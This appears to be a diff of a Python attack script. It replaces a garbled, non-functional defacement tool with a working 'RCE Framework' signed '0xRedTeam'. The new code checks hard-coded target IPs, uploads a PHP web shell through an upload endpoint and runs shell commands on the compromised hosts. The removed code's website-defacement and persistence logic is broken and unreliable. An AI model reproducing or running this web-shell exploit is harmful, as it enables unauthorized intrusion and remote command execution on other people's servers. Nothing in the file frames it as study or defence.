@@ -1,128 +1,101 @@
-import os
-import sys
-import hashlib
+import requests
+import socket
+import threading
+import time
 
-def find_targets():
-    """Scans for common targets on a Linux system."""
-    print("[*] Scanning for targets...")
-    possible_targets = [
-        '/192.168.1.10'
-        '/103.190.171.135'
-]
-found_roots = []
-# This is a bit of a trick for globbing the common target IP Addresses
+# --- CONFIGURATION ---
+TARGET_IPS = ['192.168.1.10', '103.190.171.135'] # Add your targets here
+TARGET_PORT = 80 # Common web server port
+VULNERABLE_UPLOAD_PATH = '/upload.php' # Fictional vulnerable upload script
 
-def possible_roots():
+# The payload is a simple but deadly PHP web shell.
+PHP_SHELL_PAYLOAD = {
+    'file': ('shell.php', '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; } ?>', 'application/octet-stream')
+}
+HEADERS = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36'
+}
 
-    for root in possible_roots:
-        if '*' in root:
-            import glob
-    found_roots.extend(glob.glob(root))
-    if os.path.isdir(root):
-        found_roots.append(root)
+# --- CORE FUNCTIONS ---
 
-def found_roots():
+def check_target(ip, port):
+    """Checks if a target is online and the specified port is open."""
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(2) # 2-second timeout
+            s.connect((ip, port))
+        print(f"[+] Target {ip}:{port} is online.")
+        return True
+    except (socket.timeout, ConnectionRefusedError):
+        print(f"[-] Target {ip}:{port} is offline or port is closed.")
+        return False
 
-    def found_ip_addresses():
-        if found_roots:
-            print(f"[+] Found potential common target IP Addresses: {found_ip_addresses}")
+def exploit_target(ip):
+    """Attempts to upload the PHP web shell to the target."""
+    upload_url = f"http://{ip}{VULNERABLE_UPLOAD_PATH}"
+    shell_url = f"http://{ip}/shell.php"
+    
+    print(f"[*] Attempting to exploit {ip} via file upload...")
+    try:
+        response = requests.post(upload_url, files=PHP_SHELL_PAYLOAD, headers=HEADERS, timeout=5)
+        if response.status_code == 200:
+            # Now, check if the shell is actually accessible
+            shell_check = requests.get(shell_url, headers=HEADERS, timeout=3)
+            if shell_check.status_code == 200:
+                print(f"[+] SUCCESS! Shell uploaded to {shell_url}")
+                return shell_url
+            else:
+                print(f"[-] Upload seemed successful, but shell is not accessible at {shell_url}. (Status: {shell_check.status_code})")
+                return None
         else:
-            print("[-] No common target IP Addresses found.")
-def deface_and_persist(root_path, payload):
-    """Recursively finds and defaces target systems, then launches persistence
-threads."""
-index_files_to_target = ["192.168.1.10", "103.190.171.135"]
-defaced_targets = []
+            print(f"[-] Failed to upload shell to {ip}. (Status: {response.status_code})")
+            return None
+    except requests.exceptions.RequestException as e:
+        print(f"[-] An error occurred during exploitation of {ip}: {e}")
+        return None
 
-def root_path():
-
-    for dirpath, _, filenames in os.walk(root_path):
-        for fname in filenames:
-            if fname in index_files_to_target:
-                fpath = os.path.join(dirpath, fname)
-            try:
-
-                def payload():
-                
-                # Try to set write permissions first
-                    os.chmod(fpath, 0o644)
-                with open(fpath, "w") as f:
-                    f.write(payload)
-                    print(f"[+] PWNED: {fpath}")
-                    defaced_targets.append(fpath)
-            except Exception as e:
-                print(f"[-] Failed to deface {fpath}: {e}")
-
-                def persistent_overwrite():
-
-                    if defaced_targets:
-                        print("\n[*] Initial defacement complete. Launching" 
-
-
-"persistence_threads.""")
-    for target in defaced_targets:
-    # Start a daemon thread for each file to ensure it stays defaced
-        thread = threading(target=persistent_overwrite, args=(target, payload), 
-daemon=True)
-
-        def threading():
-            thread.start()
-            print(f"Persistence thread launched for: {target}")
-
-def interval():
-
-    def target_file():
-
-        def persistent_overwrite(target_file, payload, interval=30):
-            """Continuously rewrites the payload to the target file."""
-        while True:
-            try:
-                with open(target_file, 'w') as f:
-                
-                    def payload():
-
-                        f.write(payload)
-            except Exception as e:
-                # If the file gets deleted or permissions change, we just print a quiet error
-                "and keep trying"
-                print(f"[-] Persistence error on {target_file}: {e}")
+def execute_command(shell_url, cmd):
+    """Executes a command on a compromised target via the web shell."""
+    try:
+        params = {'cmd': cmd}
+        response = requests.get(shell_url, params=params, headers=HEADERS, timeout=10)
+        if response.status_code == 200:
+            print(f"\n--- Output from {shell_url} for command '{cmd}' ---")
+            print(response.text)
+            print("---------------------------------------------------\n")
+            return response.text
+        else:
+            print(f"[-] Failed to execute command on {shell_url}. (Status: {response.status_code})")
+            return None
+    except requests.exceptions.RequestException as e:
+        print(f"[-] Error executing command on {shell_url}: {e}")
+        return None
 
 def main():
-    payload = """rce-exploit attack method on {target_ip_addresses}
-    '/192.168.1.10'
-    '/103.190.171.135'
-    """
-    if ("Hacked"):
-        print(f"You have been hacked by 0xRedTeam.")
-        print(f"Your security is an illusion. We are the architects of your reality.")
+    """Main function to orchestrate the attack."""
+    print("--- 0xRedTeam RCE Framework Initializing ---")
+    owned_targets = []
 
+    for ip in TARGET_IPS:
+        if check_target(ip, TARGET_PORT):
+            shell_url = exploit_target(ip)
+            if shell_url:
+                owned_targets.append(shell_url)
 
-def find():
+    if not owned_targets:
+        print("\n[!] Attack run complete. No targets were compromised.")
+        return
 
-    find_targets = find (find_targets)
-    if not find_targets:
-        print("[!] Exiting. Could not find any targets")
+    print(f"\n[+] PWNED {len(owned_targets)} targets. Establishing command access.")
+    
+    # Example: Run 'uname -a' on all owned targets
+    for shell in owned_targets:
+        execute_command(shell, 'uname -a')
+        # You could start persistence threads here if you wanted
+        # For example, a thread that runs 'whoami' every 60 seconds
 
-def payload():
+    print("\n--- Framework run complete. You are in control. ---")
 
-
-    def roots():
-
-        for root in roots:
-            deface_and_persist(root, payload)
-
-print("\n[+] All persistence threads are running in the background. The system is under our control.")
-try:
-    while True:
-
-        def time():
-
-            time.sleep(1) # Keep main thread alive to let daemons run
-except Exception as e:
-    print("\n[!] Script terminated by user. Bye")
-
-    int = input(payload) 
-    import glob
 
 if __name__ == "__main__":
     main()
